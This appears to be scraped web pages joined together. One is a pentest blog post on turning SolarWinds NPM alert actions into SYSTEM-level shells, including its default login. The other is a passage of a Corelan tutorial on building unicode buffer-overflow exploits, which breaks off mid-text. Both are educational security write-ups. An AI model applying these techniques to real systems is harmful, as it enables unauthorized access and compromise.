Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [135]likes-master\n%d"}
{"text":"#[1]alternate [2]VIVI\nJump to:\n[3]Navigation\n__________________________________________________________________\n* [4]home\n* \/ [5]blog\n* \/ [6]pentesting\n* \/\n2017-06-15-abusing-solarwinds-network-performance-monitor-for-post-\nexploitation\nAbusing SolarWinds Network Performance Monitor for Post-Exploitation\n15 Jun 2017 in [7]Pentesting on [8]post-exploitation, Solarwinds Last\nmodified at: 2021-07-30\nAbusing SolarWinds Network Performance Monitor for Post-Exploitation\nWindows post-exploitation with SolarWinds NPM.\n* [9]Background\n* [10]SolarWinds NPM\n* [11]Abusing NPM Alerts\n+ [12]1. Login to NPM\u2019s web console\n+ [13]2. Alerts management\n+ [14]3. Create a new alert or duplicate and edit an existing\none\n+ [15]4. Configure a new alert or jump straight to trigger\nactions\n+ [16]5. Add a new trigger action\n+ [17]6. Configure trigger action\n+ [18]7. Simulate trigger action\n+ [19]8. Pop shells\n* [20]Conclusion\nBackground\nDuring a pentest late last year I got access to a SolarWinds Network\nPerformance Monitor (NPM) application via its web administration\nconsole. I got lucky, the admin had just started setting it up and\nhe\/she hadn\u2019t gotten around to changing its default credentials.\nI didn\u2019t think much of the access at first, all I could see from the\nadmin panel was a bunch of nodes\/devices that the application was\nmonitoring. But since I was all out of options that I could use to get\na foothold on any of the in-scope servers, I decided to spend a little\nmore time getting acquainted with NPM.\nAfter burning a few hours going through NPM\u2019s user guide I found a way\nto use my access to the web console to execute privileged commands on\nthe underlying operating system \u2013 which is what this post is about.\nSolarWinds NPM\nSolarWinds NPM (Network Performance Monitor) is SolarWinds\u2019 flagship\ntool for network monitoring and arguably one of the most popular\nmonitoring solutions on the market today. NPM 12.1 is the most recent\nversion of the tool at the time of writing. I can\u2019t go through all of\nits features, but feel free to check them out yourself on\n[21]SolarWinds\u2019 website.\nTo put it as simply as I can; NPM monitors network devices and triggers\nalerts when something goes wrong. This post is about abusing NPM\u2019s\nalerting features for post-exploitation activities.\nNOTE: This post is purely about post-exploitation, so you\u2019ll already\nneed to have gained access to NPM\u2019s web administration console for\nthe information here to be of any use.\nAbusing NPM Alerts\nLike I said above, NPM monitors network devices and kicks off an alert\nwhen an event occurs. NPM comes with a few alerts pre-installed and it\nalso allows administrators to configure custom alerts for specific\nevents they would like monitored.\nSolarWinds are kind enough to offer a free 30 day evaluation of the\nfull product. I downloaded this and set it up in a virtual environment\nto demonstrate how alerts can be used to gain access to the SolarWinds\nserver and pivot around a target network.\n1. Login to NPM\u2019s web console\nFirst thing\u2019s first, login to the web console. After installation, mine\ncould be found at:\nhttp:\/\/IP-ADDRESS:8787\/Orion\/Login.aspx\n* Default credentials; username \u2018admin\u2019 with a blank password.\nSolarWinds NPM login\n2. Alerts management\nNext, we head to the alerts management page which you can get to by\nclicking on the \u2018Alerts\u2019 menu and then selecting \u2018Manage Alerts\u2019.\nManage alerts\n3. Create a new alert or duplicate and edit an existing one\nYou have 2 options here; you can choose to create a new alert or\nduplicate and edit an existing one.\nI\u2019ve found that duplicating and editing an existing one is a lot easier\nsince you won\u2019t have to waste any time configuring a new alert with\noptions you won\u2019t use. Just make sure you pick an alert to edit that\u2019s\nlikely to be assigned to a Windows host. If you can\u2019t find one, just\ncreate a new one.\nCreate or edit alert\nAlternatively, you can navigate directly to a monitored Windows host\nfrom the Nodes Summary tab and add a new alert from there.\nNode management\nNOTE: Don\u2019t worry about messing around with NPM\u2019s configuration if\nyou\u2019re doing this in a client\u2019s production environment, you won\u2019t\nhave to save any of the alerts you create\/edit.\n4. Configure a new alert or jump straight to trigger actions\nIf you chose to create a new alert, you\u2019ll have to configure a few\nrequirements before getting to the \u2018Trigger Actions\u2019 menu which is\nwhere the real fun is.\nIf you chose to duplicate and edit an existing alert you can jump\nstraight to the \u2018Trigger Actions\u2019 menu by clicking on it since the\nrequirements have already been filled in for you.\nEdit alert 1\nTrigger actions\n5. Add a new trigger action\nTrigger actions are simply what NPM should do when the event\/condition\nin question occurs. This is where the abuse begins.\nNetwork monitoring solutions used to be pretty simple programs; they\nmonitored network devices and sent admins via email when an event\noccurred.\nTrigger actions 2\nI\u2019m pretty sure that the most popular kind of trigger action is still\nemailing an admin, but as network monitoring solutions have evolved,\nthe trigger actions they offer to administrators have developed far\nbeyond the traditional \u2018email an admin\u2019 alert.\nClick on \u2018Add Action\u2019 to see what I mean.\nTrigger action options Mo features, Mo problems.\nSelect the \u2018Execute an External Program\u2019 trigger action (you can see\nwhere this is going, can\u2019t you?).\n6. Configure trigger action\nOnce you\u2019ve selected the trigger action, you\u2019ll have to configure it.\nYou\u2019ll need some malicious commands to execute. What command to use is\ncompletely up to you, but since it\u2019s a Windows box, you\u2019ll probably\nwant to use Powershell to get yourself a remote shell on the underlying\nOS.\nI setup an Empire listener on my attacker box and generated a\nPowershell launcher to use as the trigger action command\/program.\nEmpire listener\nEmpire launcher\nAll you have to do now is paste your command into the \u2018Network path to\nexternal program\u2019 text area. It doesn\u2019t seem to have any character\nlimits, so the entire Powershell launcher string should fit\ncomfortably.\nThe name of the action can be whatever you choose. Hit \u2018Save\u2019 once\nyou\u2019re done.\nConfigure action\n7. Simulate trigger action\nThis is why I said you don\u2019t have to worry about messing around with a\nclient\u2019s NPM configuration in a live environment; you won\u2019t actually\nhave to save the alert and wait for an event to occur for your trigger\naction to be executed. NPM has a handy little simulation feature for\nall trigger actions so admins can test if their trigger actions work\nlike they\u2019re supposed to before committing them to NPM\u2019s configuration.\nWe\u2019re going to use this feature to execute our command on the server.\nSimulate action\nYou can actually select multiple hosts to run the simulation on. I had\nonly setup one host in my virtual lab, but a NPM server in a production\nenvironment is highly likely to have more targets to choose from.\nChoose targets\nOnce you\u2019re done choosing targets, just hit \u2018Execute\u2019.\nExecute action\nExecute success\n8. Pop shells\nThe shells come in with NT AUTHORITY\\SYSTEM rights. No better feeling,\nright?\nEmpire shells\nAt first, the SYSTEM level access surprised me until I realised that\nevery single SolarWinds process on the NPM server runs as SYSTEM.\nSolarWinds processes\nNOTE: NPM allows admins to create users and assign them very specific\nrights. I created a new user and stripped them of every right but\nmanaging alerts and repeated the steps above using their account. So\nlong as a user has the \u2018Alert Mgmt\u2019 right, their access can be abused\nto gain SYSTEM level access on the NPM server.\nTest account\nConclusion\nI wouldn\u2019t be surprised if there are a lot more ways to abuse NPM\nadministration to get OS level access but I didn\u2019t find anything online\nabout this specific method so I figured I\u2019d blog about it.\nI\u2019d be more than happy to hear about more techniques so feel free to\nreach out if you know of any. Happy hunting.\n__________________________________________________________________\nGabriel Mathenge\nAuthor\nPost by VIVI.\nSocial:\n* [22]Twitter\n* [23]GitHub\n* [24]YouTube\n* [25]Email\nRelated Posts\nPlugins for Persistence\n[26]Plugins for Persistence\nUsing code editor plugins for persistence. [27]Continue reading Plugins\nfor Persistence\nAuto(It)mating your .NET Tradecraft\n[28]Auto(It)mating your .NET Tradecraft\nAutoIt, .NET and Windows protection bypasses. [29]Continue reading\nAuto(It)mating your .NET Tradecraft\nRandom Posts\n* [30]WiFi Social Engineering 18 Jun 2016\n* [31]Securing your Empire C2 with Apache mod_rewrite 03 Nov 2017\n* [32]Attack Infrastructure Logging - Part 3 - Graylog Dashboard 23\nMar 2018\n__________________________________________________________________\n\u00a9 2022. VIVI.\n__________________________________________________________________\n[33]VIVI [34]\nVIVI\nSecurity shenanigans\nNavigation:\n* [35]Blog\n* [36]About\n* [37]Presentations\nSocial:\n* [38]Twitter\n* [39]GitHub\n* [40]YouTube\n* [41]Email\n__________________________________________________________________\nTemplates (for web app):\nLoading\u2026\nError\nSorry, an error occurred while loading .\n[42]Permalink (BUTTON) Dark Mode (BUTTON) Search\n____________________ (BUTTON) Close"}
{"text":"#[1]Corelan Cybersecurity Research \u00bb Feed [2]Corelan Cybersecurity\nResearch \u00bb Comments Feed [3]Corelan Cybersecurity Research \u00bb Exploit\nwriting tutorial part 7 : Unicode \u2013 from 0x00410041 to calc Comments\nFeed [4]alternate [5]alternate [6]alternate\n[7]Corelan Cybersecurity Research\n:: Knowledge is not an object, it's a flow ::\n* [8]Home\n*\n* [9]Articles\n*\n* [10]Free Tools\n+ [11]AD & CS\no [12]AD Disable Users\no [13]Certificate List Utility\no [14]PVE Find AD User\n+ [15]Exchange Transport Agents\no [16]Attachment filter\no [17]Attachment rename\n+ [18]Networking\no [19]Cisco switch backup utility\no [20]Network monitoring with powershell\no [21]TCP Ping\n+ [22]Security Related Tools\n*\n* [23]Security\n+ [24]Corelan Team Members\no [25]Corelan Team Membership\n+ [26]Corelan Training \"Corelan Live\u2026\n+ [27]Exploit writing tutorials\n+ [28]Metasploit\no [29]FTP Client fuzzer\no [30]HTTP Form field fuzzer\no [31]Simple FTP Fuzzer \u2013 Metasploit\u2026\n+ [32]Nessus\/Openvas ike-scan wrapper\n+ [33]Vulnerability Disclosure Policy\n+ [34]mona.py PyCommand for Immunity Debugger\no [35]Download mona.py\no [36]Mona.py \u2013 documentation\n+ [37]Corelan ROPdb\n+ [38]Mirror for BoB\u2019s Immunity Debugger\u2026\n*\n* [39]Terms of use\n*\n* [40]Donate\n*\n* [41]About\u2026\n+ [42]About Corelan Team\n+ [43]About me\n+ [44]Antivirus\/antimalware\n+ [45]Corelan public keys\n+ [46]Sitemap\n\u00ab [47]Str0ke R.I.P. (or alive & kicking ?)\n[48]Exchange Server 2010 available worldwide \u00bb\nPlease consider donating: [49]https:\/\/www.corelan.be\/index.php\/donate\/\n51,480 views\nExploit writing tutorial part 7 : Unicode \u2013 from 0x00410041 to calc\nPublished November 6, 2009 | By [50]Peter Van Eeckhoutte (corelanc0d3r)\nFinally \u2026 after spending a couple of weeks working on unicode and\nunicode exploits, I\u2019m glad and happy to be able to release this next\narticle in my basic exploit writing series : writing exploits for stack\nbased unicode buffer overflows (wow \u2013 that\u2019s a mouthful).\nYou may (or may not) have encountered a situation where you\u2019ve\nperformed a stack buffer overflow, overwriting either a RET address or\na SEH  record, but instead of seeing 0x41414141 in EIP, you got\n0x00410041.\nSometimes, when data is used in a function, some manipulations are\napplied. Sometimes data is converted to uppercase, to lowercase, etc\u2026\nIn some situations data gets converted to unicode.  When you see\n0x00410041 in EIP, in a lot of cases, this probably means that your\npayload had been converted to unicode before it was put on the stack.\nFor a long time, people assumed that this type of overwrite could not\nbe exploited. It could lead to a DoS, but not to code execution.\nIn 2002, Chris Anley wrote a paper showing that this statement is\nfalse. The term \u201cVenetian Shellcode\u201d was born.\nIn Jan 2003, [51]a phrack article was written by obscou, demonstrating\na technique to turn this knowledge into working shellcode, and about\none month later, [52]Dave Aitel released a script to automate this\nprocess.\nIn 2004, [53]FX demonstrated a new script that would optimize this\ntechnique even further.\nFinally, a little while later, SkyLined released his famous alpha2\nencoder to the public, which allows you to build unicode-compatible\nshellcode too.  We\u2019ll talk about these techniques and tools later on.\nThis is 2009 \u2013 here\u2019s my tutorial. It does not contain anything new,\nbut it should explain the entire process, in just one document.\nIn order to go from finding 0x00410041 to building a working exploit,\nthere are a couple of things that need to be clarified first. It\u2019s\nimportant to understand what unicode is, why data is converted to\nunicode, how the conversion takes place, what affects the conversion\nprocess, and how the conversion affects the process of building an\nexploit.\nWhat is unicode and why would a developer decide to convert data to unicode ?\nWikipedia states : \u201cUnicode is a computing industry standard allowing\ncomputers to represent and manipulate text expressed in most of the\nworld\u2019s writing systems consistently. Developed in tandem with the\nUniversal Character Set standard and published in book form as The\nUnicode Standard, the latest version of Unicode consists of a\nrepertoire of more than 107,000 characters covering 90 scripts, a set\nof code charts for visual reference, an encoding methodology and set of\nstandard character encodings, an enumeration of character properties\nsuch as upper and lower case, a set of reference data computer files,\nand a number of related items, such as character properties, rules for\nnormalization, decomposition, collation, rendering, and bidirectional\ndisplay order (for the correct display of text containing both\nright-to-left scripts, such as Arabic or Hebrew, and left-to-right\nscripts).\u201d.\nIn short, unicode allows us to visually represent and\/or manipulate\ntext in most of the systems across the world in a consistent manner.\nSo applications can be used across the globe, without having to worry\nabout how text will look like when displayed on a computer \u2013 almost any\ncomputer \u2013 in another part of the world.\nMost of you should be more or less familiar with ASCII. In essence,\nuses 7 bits to represent 128 characters, often storing them in 8 bits,\nor one byte per character. The first character starts at 00 and the\nlast is represented in hex by 7F. (You can see the full ASCII table at\n[54]http:\/\/www.asciitable.com\/)\nUnicode is different. While there are many different forms of unicode,\nUTF-16 is one of the most popular. Not surprisingly, it is made up of\n16 bits, and is broken down in different blocks\/zones (read more at\n[55]http:\/\/czyborra.com\/unicode\/characters.html).  (For your\ninformation, an extension has been defined to allow for 32 bits). Just\nremember this : the characters needed for today\u2019s living language\nshould still be placed in the original Unicode plan 0 (a.k.a. Basic\nMultilangual Plane = BMP). That means that most plain language\ncharacters, like the ones used to write this article, represented in\nunicode, start with 00 (followed by another byte that corresponds with\nthe hex value of the original ASCII character).\nYou can find a great overview of the various Unicode Character Codes\n[56]here\nExample :  Ascii character \u2018A\u2019 = 41 (hex), the Basic Latin Unicode\nrepresentation is 0041.\nThere are many more code pages, and some of them don\u2019t start with 00.\nThat\u2019s important to remember too.\nSo far so good \u2013 having a unified way to represent characters is nice\u2026\nbut why is a lot of stuff still in ASCII ? Well, most applications that\nwork with strings, use a null byte as string terminator.  So if you\nwould try to stuff unicode data into an ASCII string, the string would\nbe ended right away\u2026  So this is why for example plain text\napplications (such as smtp, pop3, etc) still use ASCII for setting up\ncommunications.  (OK, the payload can be encoded and can use unicode,\nbut the transport application itself uses ASCII).\nIf you convert ASCII text into Unicode (code page ansi), then the\nresult will look like as if \u201c00\u201d is added before every byte.  So AAAA\n(41 41 41 41) would now look like 0041 0041 0041 0041.  Of course, this\nis just the result of a conversion from data to wide char data. The\nresult of any unicode conversion depends on the codepage that was used.\nLet\u2019s have a look at the [57]MultiByteToWideChar function (which maps a\ncharacter string to a wide-character unicode string) :\nint MultiByteToWideChar(\nUINT CodePage,\nDWORD dwFlags,\nLPCSTR lpMultiByteStr,\nint cbMultiByte,\nLPWSTR lpWideCharStr,\nint cchWideChar\n);\nAs you can see, the CodePage is important.  Some possible values are :\nCP_ACP (Ansi code page, which is used in Windows, also referred to as\nutf-16), CP_OEMCP (OEM code page), CP_UTF7 (UTF-7 code page), CP_UTF8\n(UTF-8 code page) etc\nThe lpMultiBytestr parameter contains the character string to be\nconverted, and the lpWideCharStr contains the pointer to the buffer\nthat will receive the translated (unicode) string.\nSo it\u2019s wrong to state that unicode = 00 + the original byte. It\ndepends on the code page.\nYou can see the code page that is used on your system by looking at the\n\u201cRegional and Language Options\u201d. On my system, it looks like this :\n[58]image\n[59]The paper from FX shows a nice table of the ASCII characters (in\nhex), and the various unicode hex representations (ansi, oem, utf-7 and\nutf-8).  You\u2019ll notice that, from ASCII 0x80, some of the ansi\nrepresentations don\u2019t contain null bytes anymore (but they are\nconverted into 0xc200XXXX or 0xc300XXXX), some of the OEM\ntransformations are entirely different, and so on.\nSo it\u2019s important to remember that only the ASCII characters between\n01h and 7fh have a representation in ansi unicode where null bytes are\nadded for sure.   We\u2019ll need this knowledge later on.\nA developer may have chosen to use this function on purpose, for the\nobvious reasons (as indicated above). But sometimes the developer may\nnot even know to what extend unicode will be used \u201cunder the hood\u201d when\nan application is built\/compiled. In fact, the Win32 API\u2019s often\ntranslate strings to Unicode before working with them. In certain\ncases, (such as with Visual Studio), the API used is based on whether\nthe _UNICODE macro is set during the build or not.  If the macro is\nset, routines and types are mapped to entities that can deal with\nunicode.   API functions may get changed as well.  For example the\nCreateProcess call is changed to CreateProcessW (Unicode) or\nCreateProcessA (Ansi), based on the status of the macro.\nWhat is the result of unicode conversion \/ impact on exploit building ?\nWhen an input string is converted to ansi unicode, for all characters\nbetween 0x00 and 0x7f, a null byte is prepended. Furthermore, a lot of\ncharacters above 0x7f are translated into 2 bytes, and these 2 bytes\nmay not necessarily contain the original byte.\nThis breaks everything we have learned about exploits and shellcode so\nfar.\nIn all previous tutorials, we attempt to overwrite EIP with 4 bytes\n(excluding intentionally partial overwrites).\nWith Unicode, you only control 2 out of these 4 bytes (the other 2 are\nmost likely going to be nulls\u2026 so in a way, you control those nulls\ntoo)\nFurthermore, the available instruction set (used for jumping, for\nshellcode, etc) becomes limited.  After all, a null byte is placed\nbefore most bytes.  And on top of that, other bytes (> 0x7f) are just\nconverted to something entirely different. This [60]Phrack article (see\nchapter 2) explains which instructions can and which ones cannot be\nused anymore.\nEven simple things such as a bunch of nops (0x90) becomes a problem.\nThe first nop may work. The second nop will (due to alignment) becomes\ninstruction 0090 (or 009000)\u2026 and that\u2019s not a nop anymore.\nSo that sound like a lot of hurdles to take.  No wonder at first people\nthought this was not exploitable\u2026\nRead the documents\nI have briefly explained what happened in the months and years after\nthe publication of \u201cCreating Arbitrary Shellcode in Unicode Expanded\nstring\u201d.\nWhen looking back at reading and trying to understand all of these\ndocuments and techniques (see the url\u2019s at the beginning of this\ntutorial), it became clear that this is great stuff. Unfortunately it\ntook me a little while to understand and to put everything together.\nOk, some concepts are well explained in these documents\u2026  but they only\nshow you part of the picture.  And I could not find any good resources\nthat would put one and one together.\nUnfortunately, and despite my efforts and the fact that I have asked\nmany questions (emails, twitter, mailing lists, etc), I did not receive\na lot of help from other people at first.\nSo either not a lot of people wanted to explain this to me (perhaps\nthey forgot they weren\u2019t born with these skills\u2026 they had to learn this\ntoo one way or another),were too busy answering my lame question,  or\njust could not explain this to me, or they simply ignored me because\u2026\n?   I don\u2019t know.\nAnyways\u2026  in the end, a handful of kind people actually took the time\nto respond to me properly (instead of just referring to some pdf\ndocuments over and over again).   THANK YOU guys. If you read this, and\nif you want your name here, let me know.\nBack to these pdf files\u2026 ok, these documents and tools are great. But\nevery single time I\u2019ve read one of these documents, I starting thinking\n: \u201cOk, that\u2019s great\u2026 now how do I apply this ? How do I convert this\nconcept into a working exploit\u201d.\nPlease, do me a favor, and take the time to read these documents\nyourself.  If you manage to fully understand how to build unicode\nexploits purely based on these documents, from A to Z, then that\u2019s\ngreat\u2026  then you can skip the rest of this tutorial (or continue to\nread & make fun of me because I had a hard time understanding this\u2026)\nBut if you want to learn how to glue all of these pdf files and tools\ntogether and take the extra mile required to convert that into building\nexploits, then continue reading.\nSome of you may be familiar with unicode exploits, linked to browser\nbased bugs and heap spraying.  Despite the fact that the number of\nbrowser bugs has increased exponentially over the last couple of years\n(and the number of exploits and resources are increasing), I am not\ngoing to discuss this exploit technique today. My main focus is to\nexplain stack based overflows that are subject to unicode conversion.\nSome parts of this document will come handy when attacking browsers as\nwell (especially the shellcode piece of this document), others may not.\nCan we build an exploit when our buffer is converted to unicode ?\nFirst of all\nFirst of all, you will learn that there is no catch-all template for\nbuilding unicode exploits. Each exploit could (and probably will) be\ndifferent, will require a different approach and may require a lot of\nwork and effort.  You\u2019ll have to play with offsets, registers,\ninstructions, write your own lines of venetian shellcode, etc\u2026   So the\nexample that I will use today, may not be helpful at all in your\nparticular case.   The example I will use is just an example on how to\ndeploy various techniques, basically demonstrating the ways of building\nyour own lines of code and put everything together to get the exploit\ndo what you want it to do.\nEIP is 0x00410041. Now what ?\nIn the previous tutorials, we have discussed 2 types of exploits :\ndirect RET overwrite or SEH overwrites.  These 2 types of overwrites\nare, of course, still valid with unicode exploits.  In a typical stack\nbased overflow, you will either overwrite RET with 4 bytes (but due to\nUnicode, only 2 bytes are under your control), or you a overwrite the\nStructured Exception Handler record fields (next SEH and SE Handler)\neach with 4 bytes, again out of which only 2 are under your control.\nHow can we still abuse this to get EIP do what we need it to do ?  The\nanswer is simple : overwrite the 2 bytes at EIP with something useful.\nDirect RET : overwriting EIP with something useful\nThe global idea behind \u201cjumping to your shellcode\u201d when owning EIP is\nstill the same, whether this is an ASCII or unicode buffer overflow. In\nthe case of a direct RET overwrite, you will need to find a pointer to\nan instruction (or series of instructions) that will take you to your\nshellcode, and you need to overwrite EIP with that pointer.  So you\nneed to find a register that points to your buffer (even if it contains\nnull bytes between every character \u2013 no need to worry about this yet),\nand you will need to jump to that register.\nThe only problem is the fact that you cannot just take any address.\nThe address you need to look for needs to be \u2018formatted\u2019 in such a way\nthat, if the 00\u2019s are added, the address is still valid.\nSo essentially, this leaves us only with 2 options :\n1. find an address that points to your jump\/call\/\u2026 instruction, and\nthat looks like this :  0x00nn00mm.  So if you overwrite RET with\n0xnn,0xmm  it would become 00nn00mm\nor, alternatively, if you cannot find such an address :\n2. find an address that is also formatted 0x00nn00mm, and close to the\ncall\/jump\/\u2026 instruction that you want to execute. Verify that the\ninstructions between the address and the actual call\/jump address will\nnot harm your stack\/registers, and use that address.\nHow can we find such addresses ?\nFX has written a [61]nice plugin for ollydbg (called [62]OllyUNI), and\nmy own [63]pvefindaddr plugin for ImmDbg will assist you with this task\nas well:\nLet\u2019s say you need to jump to eax.  Download pvefindaddr.py and put it\nin the pyCommand folder of your ImmDbg installation.  Then open the\nvulnerable application in ImmDbg and run\n!pvefindaddr j eax\nThis will list all addresses to \u201cjump eax\u201d. These addresses will not\nonly be displayed in the log view, but they will also be written to a\ntext file called j.txt.\nOpen this file and search for \u201cUnicode\u201d.\nYou may find 2 types of entries : entries that says \u201cMaybe Unicode\ncompatible\u201d and entries that say \u201cUnicode compatible\u201d.\nIf you can find \u201cUnicode compatible\u201d addresses, then these are\naddresses in the 0x00nn00mm form.  (So you should be able to use one of\nthese addresses without further investigation)\nIf you find \u201cMaybe Unicode compatible\u201d addresses, then you need to look\nat these addresses.  They will be in the 0x00nn0mmm form.  So if you\nlook at the instructions between 0x00nn00mm and 0x00nn0mmm, and you see\nthat these instructions will not harm the application flow\/registers\/\u2026,\nthen you can use the 0x00nn00mm address (and it will step all the way\nuntil it reaches the call\/jump instruction at 0x00nn0mmm). In essence\nyou will be jumping more or less close\/near the real jump instruction,\nand you hope that the instructions between your location and the real\njump will not kill you :-)\nOllyUNI will basically do the same. It will look for Unicode friendly\naddresses. In fact, it will look for all call\/jump reg\/\u2026  instructions\n(so you\u2019ll have to go through the log & see if you can find an address\nthat jumps to the desired register.\n[64]image\nBasically, we are looking for addresses that contain null bytes in the\nright place. If EIP contains 0x00nn00mm, then you must find an address\nwith the same format.  If EIP contains 0xnn00mm00, then you must find\nan address with this format.\nIn the past, we have always tried to avoid null bytes because it acts\nas a string terminator.  This time we need addresses with null bytes.\nWe don\u2019t need to worry about string termination because we are not\ngoing to put the null bytes in the string that is sent to the\napplication.  The unicode conversion will insert the null bytes for us\nautomagically.\nLet\u2019s assume you have found an address that will make the jump. Let\u2019s\nsay the address is 0x005E0018. This address does not contain characters\nthat have a hex value > 7f.  So the address should work.\nI assume you have figured out after how many bytes you will overwrite\nsaved EIP.  (You may able to use a metasploit pattern for this, but\nyou\u2019ll have to look at the bytes before and after overwriting EIP, in\norder to get at least 4 characters).  I\u2019ll show an example on how to do\nthe match later on in this tutorial.\nSuppose you overwrite EIP after sending 500 A\u2019s. And you want to\noverwrite EIP with \u201cjump eax (at 0x005e0018)\u201d (because EAX points to\nthe A\u2019s), then your script should look like this :\nmy $junk=\"A\" x 500;\nmy $ret=\"\\x18\\x5e\";\nmy $payload=$junk.$ret;\nSo instead of overwriting EIP with pack(\u2018V\u2019,0x005E0018), you overwrite\nEIP with  5E 18. Unicode adds null bytes in front of 5E, and between 5E\nand 18, so EIP will be overwritten with 005e0018\n(The string-to-widechar conversion took care of adding the nulls right\nwere we wanted them to be.  Step 1 accomplished.)\nSEH based : owning EIP + short jump ? (or not ?)\nWhat if the vulnerability is SEH based ?  From tutorial part 3 and 3b,\nwe have learned that we should overwrite SE Handler with a pointer to\npop pop ret, and overwrite nSEH with a short jump.\nWith unicode, you still need to overwrite SE Handler with a pointer to\npop pop ret.  Again, pvefindaddr will help us :\n!pvefindaddr p2\nAgain, this will write output to the log, and also to a file called\nppr2.txt. Open the file and look for \u201cUnicode\u201d again.  If you can find\nan entry, that does not contain bytes > 7f, then you can try to\noverwrite SE Handler with this address. Again, leave out the null bytes\n(they will be added automatically due to unicode conversion).  At nseh,\nput \\xcc\\xcc  (2 breakpoints, 2 byte. Again, null bytes will be added),\nand see what happens.\nIf all goes well, pop pop ret is executed, and you will be redirected\nto the first breakpoint.\nIn non-unicode exploits, one would need to replace these breakpoints at\nnseh with a short jump and jump over the SE Handler address to the\nshellcode.  But I can assure you, writing short jump in unicode, with\nonly 2 bytes, separated by null bytes\u2026 don\u2019t count on it. It won\u2019t\nwork.\nSo it ends here.\nSEH based : jump (or should I say \u2018walk\u2019 ?)\nOk. It does not end here. I was just kidding.  We can make this work,\nunder certain conditions.  I will explain how this works in the example\nat the bottom of this post, so I\u2019ll stick to the theory for now.\nEverything will become clear when you look at the example, so don\u2019t\nworry.  (and if you don\u2019t understand, just ask. I\u2019ll be more than happy\nto explain)\nThe theory is : instead of writing code to make a short jump\n(0xeb,0x06), perhaps we can have the exploit run harmless code so it\njust walks over the overwritten nseh and seh, and ends up right after\nwhere we have overwritten SEH, executing code that is placed after we\nhave overwritten the SE structure.  This is in fact exactly what we\nwanted to achieve in the first place by jumping over nSEH and SEH.\nIn order to do this, we need 2 things :\n\u2013 a couple of instructions that will, when executed, not cause any\nharm. We need to put these instructions in nSEH   and\n\u2013 the unicode compatible address used to overwrite SE Handler must,\nwhen executed as instructions, not cause any harm either.\nSound confusing ?  Don\u2019t panic.  I will explain this further in detail\nin the example at the bottom of this blog post.\nSo we can only put 0x00nn00nn in EIP ?\nYes and no.  When you look back at the [65]unicode translation table,\nyou may have some other options next to the obvious 0x00nn00nn format\nAscii values represented in hex > 0x7f are translated differently.  In\nmost of those cases (see table, page 15 \u2013 17), the translation turns\nthe unicode version into something different.\nFor example 0x82 becomes 1A20. So if you can find an address in the\nformat 0x00nn201A, then you can use the fact that 0x82 gets converted\ninto 201A.\nThe only issue you may have with this, if you are building a SEH based\nexploit, it could lead to an issue, because after the pop pop ret, the\naddress bytes are executed as instructions. As long as the instructions\nact as nops or don\u2019t cause any big changes, it\u2019s fine.  I guess you\njust have to test all available \u201cunicode compatible\u201d addresses & see\nfor yourself if there is an address that would work. Again, you can use\npvefindaddr (Immdbg plugin) to find usable pop pop ret addresses that\nare unicode compatible.\nThe addresses you could look for, would either start or end with  :\nac20 (=80 ASCII), 1a20 (=82 ASCII), 9201 (=83 ASCII), 1e20 (=84 ASCII),\nand so on (just take a look at the translation table. ).  Success is\nnot guaranteed, but it\u2019s worth while trying.\nReady to run shellcode\u2026  But is the shellcode ready ?\nOk, now we know what to put in EIP. But if you look at your ASCII\nshellcode : it will also contain null bytes and, if it was using\ninstructions (opcodes) above 0x7f, the instructions may have even\nchanged.  How can we make this work ?  Is there a way to convert ASCII\nshellcode (just like the ones that are generated with metasploit) into\nunicode compatible shellcode ?  Or do we need to write our own stuff ?\nWe\u2019re about to find out.\nShellcode : Technique 1 : Find an ASCII equivalent & jump to it\nIn most cases, the ASCII string that was fed into the application gets\nconverted to unicode after it was put on the stack or in memory. That\nmeans that it may be possible to find an ASCII version of your\nshellcode somewhere. So if you can tell EIP to jump to that location,\nit may work.\nIf the ASCII version is not directly reachable (by jumping to a\nregister), but you control the contents of one of the registers, then\nyou can jump to that register, and place some basic jumpcode at that\nlocation, which will make the jump to the ASCII version.  We will talk\nabout this jumpcode later on.\nA good example of an exploit using this technique can be found [66]here\nShellcode : Technique 2 : Write your own unicode-compatible shellcode from\nscratch\nRight. It\u2019s possible, not easy, but possible\u2026 but there are better\nways. (see technique 3)\nShellcode : Technique 3 : Use a decoder\nOk, we know that the shellcode generated in metasploit (or written\nyourself) will not work.  If the shellcode was not written specifically\nfor unicode, it will fail. (null bytes are inserted, opcodes are\nchanged, etc).\nFortunately, a couple of smart people have build some tools (based on\nthe concept of venetian shellcode) that will solve this issue.  (Dave\nAitel, FX and Skylined).\nIn essence, it boils down to this : You need to encode the ASCII\nshellcode into unicode-compatible code, prepend it with a decoder (also\nunicode-compatible). Then, when the decoder is executed, it will decode\nthe original code and execute it.\nThere are 2 main ways to do this : either by reproducing the original\ncode in a separate memory location, and then jump to that location, or\nby changing the code \u201cin-line\u201d and then running the reproduced\nshellcode.  You can read all about these tools (and the principles they\nare based on) in the corresponding documents, referred to at the\nbeginning of this blog post.  The first technique will require 2 things\n: one of the registers must point at the beginning of the\ndecoder+shellcode, and one register must point at a memory location\nthat is writeable (and where it\u2019s ok to write the new reassembled\nshellcode).  The second technique only requires one of the registers to\npoint at the beginning of the decoder+shellcode, and the original\nshellcode will be reassembled in-place.\nCan we use these tools to building working shellcode, and if so, how\nshould we use them ?  Let\u2019s find out.\n1. makeunicode2.py (Dave Aitel)\nThis script is part of CANVAS, a commercial tool from Immunity. Since I\ndon\u2019t have a license myself, I have not been able to test it (hence, I\ncannot explain how to use it).\n2. [67]vense.pl (FX)\nBased on FX\u2019 explanation in his [68]2004 Blackhat presentation, this\nawesome perl script appears to produce an improved version over what\ngets generated by makeunicode2.py\nThe output of this script is a byte string, containing a decoder and\nthe original shellcode all-in-one.  So instead of placing your\nmetasploit generated shellcode in the buffer, you need to place the\noutput of vense.pl in the buffer.\nIn order to be able to use the decoder, you need to be able to set up\nthe registers in the following way :  one register must point directly\nat the beginning of the buffer location where your shellcode (vense.pl\ngenerated shellcode) will be placed.\n(In the next chapter, I will explain how to change values in registers\nso you can point one register to any location you want.).  Next, you\nneed to have a second register, that points at a memory location that\nis writable and executable (RWX), and where it is ok to write data to\n(without corrupting anything else).\nSuppose the register that will be set up to point at the beginning of\nthe vense-generated shellcode is eax, and edi points to a writable\nlocation :\nedit vense.pl and set the $basereg and $writable parameters to the\nrequired values.\n[69]image\nNext, scroll down, and look for $secondstage\nRemove the contents of this variable and replace it with your own\n(metasploit generated) perl shellcode. 